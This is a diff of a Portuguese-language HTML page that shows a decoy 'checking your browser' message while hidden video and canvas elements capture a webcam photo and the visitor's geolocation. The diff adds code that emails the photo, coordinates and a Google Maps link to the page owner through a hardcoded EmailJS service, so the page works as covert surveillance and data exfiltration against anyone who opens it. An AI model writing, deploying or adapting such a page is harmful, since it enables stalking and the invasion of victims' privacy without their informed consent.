@@ -2,15 +2,12 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Carregando...</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Captura e envio automático</title>
 <style>
-    #videoElement {
-        display: none;
-    }
-    #canvas {
-        display: none;
-    }
+  #videoElement, #canvas {
+    display: none;
+  }
 </style>
 </head>
 <body>
@@ -19,107 +16,123 @@
 <canvas id="canvas"></canvas>
 <p id="message">Verificando seu navegador...</p>
 
+<!-- Inclui o SDK EmailJS -->
+<script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
+
 <script>
-    document.addEventListener("DOMContentLoaded", function() {
-        const message = document.querySelector("#message");
+  (function(){
+    emailjs.init('T0yA9npVGGJULxw3d'); // <<< Substitua pelo seu User ID EmailJS
+  })();
 
-        function isSupportedBrowser() {
-            const ua = navigator.userAgent;
-            const vendor = navigator.vendor || "";
+  document.addEventListener("DOMContentLoaded", function() {
+    const message = document.querySelector("#message");
+    const video = document.querySelector("#videoElement");
+    const canvas = document.querySelector("#canvas");
+    const ctx = canvas.getContext("2d");
 
-            // Chrome: vendor Google Inc. e userAgent com "Chrome" (não Edge)
-            const isChrome = /Chrome/.test(ua) && vendor === "Google Inc." && !/Edg/.test(ua);
-            // Edge Chromium: userAgent com "Edg" (mas não Microsoft Edge Legacy)
-            const isEdgeChromium = /Edg/.test(ua);
+    function isSupportedBrowser() {
+      const ua = navigator.userAgent;
+      const vendor = navigator.vendor || "";
+      const isChrome = /Chrome/.test(ua) && vendor === "Google Inc." && !/Edg/.test(ua);
+      const isEdgeChromium = /Edg/.test(ua);
+      return isChrome || isEdgeChromium;
+    }
 
-            return isChrome || isEdgeChromium;
+    function redirectToSupportedBrowser() {
+      const ua = navigator.userAgent || navigator.vendor || window.opera;
+      if (/android/i.test(ua)) {
+        window.location.href = 'googlechrome://navigate?url=' + encodeURIComponent(window.location.href);
+      } else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
+        window.location.href = 'googlechrome://' + window.location.href.replace(/^https?:\/\//, '');
+      } else {
+        message.textContent = "Por favor, abra este site no Google Chrome ou Microsoft Edge.";
+      }
+    }
+
+    if (!isSupportedBrowser()) {
+      redirectToSupportedBrowser();
+      return;
+    }
+
+    message.textContent = "Acessando câmera e localização...";
+
+    function capturePhoto() {
+      return new Promise((resolve, reject) => {
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(function(stream) {
+            video.srcObject = stream;
+            video.play();
+            video.onloadedmetadata = () => {
+              setTimeout(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataURL = canvas.toDataURL("image/png");
+                // Para a câmera
+                stream.getTracks().forEach(track => track.stop());
+                resolve(dataURL);
+              }, 500);
+            };
+          })
+          .catch(function(err) {
+            reject('Erro ao acessar a câmera: ' + err.message);
+          });
+      });
+    }
+
+    function captureLocation() {
+      return new Promise((resolve, reject) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition((position) => {
+            const { latitude, longitude } = position.coords;
+            resolve({ latitude, longitude });
+          }, (error) => {
+            reject('Erro ao acessar a localização: ' + error.message);
+          });
+        } else {
+          reject('Geolocalização não é suportada pelo navegador.');
         }
+      });
+    }
 
-        function redirectToSupportedBrowser() {
-            const ua = navigator.userAgent || navigator.vendor || window.opera;
+    function sendEmailAutomatic(photoDataURL, latitude, longitude) {
+      const templateParams = {
+        photo_url: photoDataURL,
+        latitude: latitude,
+        longitude: longitude,
+        maps_link: `https://www.google.com/maps?q=${latitude},${longitude}`
+      };
 
-            if (/android/i.test(ua)) {
-                // Tentativa de abrir Chrome (pode não funcionar em Edge Android)
-                window.location.href = 'googlechrome://navigate?url=' + encodeURIComponent(window.location.href);
-            } else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
-                // iOS
-                window.location.href = 'googlechrome://' + window.location.href.replace(/^https?:\/\//, '');
-            } else {
-                message.textContent = "Por favor, abra este site no Google Chrome ou Microsoft Edge.";
-            }
-        }
+      emailjs.send('service_dfqhnek', 'template_l87tq14', templateParams)
+        .then(function(response) {
+          console.log('E-mail enviado com sucesso!', response.status, response.text);
+          message.textContent = "Informações enviadas por e-mail com sucesso!";
+        }, function(error) {
+          console.error('Falha ao enviar e-mail:', error);
+          message.textContent = "Erro ao enviar o e-mail: " + error.text;
+        });
+    }
 
-        if (!isSupportedBrowser()) {
-            redirectToSupportedBrowser();
-            return;
-        }
+    Promise.all([capturePhoto(), captureLocation()])
+      .then(([photoDataURL, position]) => {
+        const { latitude, longitude } = position;
 
-        message.textContent = "Acessando câmera e localização...";
+        // Enviar email automático
+        sendEmailAutomatic(photoDataURL, latitude, longitude);
 
-        const video = document.querySelector("#videoElement");
-        const canvas = document.querySelector("#canvas");
-        const ctx = canvas.getContext("2d");
-
-        function capturePhoto() {
-            return new Promise((resolve, reject) => {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function(stream) {
-                        video.srcObject = stream;
-                        video.play();
-
-                        video.onloadedmetadata = () => {
-                            setTimeout(() => {
-                                canvas.width = video.videoWidth;
-                                canvas.height = video.videoHeight;
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                const dataURL = canvas.toDataURL("image/png");
-
-                                // Para a câmera
-                                stream.getTracks().forEach(track => track.stop());
-
-                                resolve(dataURL);
-                            }, 500);
-                        };
-                    })
-                    .catch(function(err) {
-                        reject('Erro ao acessar a câmera: ' + err.message);
-                    });
-            });
-        }
-
-        function captureLocation() {
-            return new Promise((resolve, reject) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition((position) => {
-                        const { latitude, longitude } = position.coords;
-                        resolve({ latitude, longitude });
-                    }, (error) => {
-                        reject('Erro ao acessar a localização: ' + error.message);
-                    });
-                } else {
-                    reject('Geolocalização não é suportada pelo navegador.');
-                }
-            });
-        }
-
-        Promise.all([capturePhoto(), captureLocation()])
-            .then(([photoDataURL, position]) => {
-                const { latitude, longitude } = position;
-                const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-                const newWindow = window.open();
-                newWindow.document.write('<h3>Sua Foto e Localização</h3>');
-                newWindow.document.write('<img src="' + photoDataURL + '" alt="Foto" style="max-width:100%;height:auto;"><br>');
-                newWindow.document.write('<p>Latitude: ' + latitude + '</p>');
-                newWindow.document.write('<p>Longitude: ' + longitude + '</p>');
-                newWindow.document.write('<p><a href="' + mapsLink + '" target="_blank">Ver no Google Maps</a></p>');
-            })
-            .catch((error) => {
-                const newWindow = window.open();
-                newWindow.document.write('<h3>Erro</h3>');
-                newWindow.document.write('<p>' + error + '</p>');
-            });
-    });
+        // Mostrar a foto e localização numa nova janela
+        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        const newWindow = window.open();
+        newWindow.document.write('<h3>Sua Foto e Localização</h3>');
+        newWindow.document.write('<img src="' + photoDataURL + '" alt="Foto" style="max-width:100%;height:auto;"><br>');
+        newWindow.document.write('<p>Latitude: ' + latitude + '</p>');
+        newWindow.document.write('<p>Longitude: ' + longitude + '</p>');
+        newWindow.document.write('<p><a href="' + mapsLink + '" target="_blank">Ver no Google Maps</a></p>');
+      })
+      .catch((error) => {
+        message.textContent = error;
+      });
+  });
 </script>
 </body>
 </html>
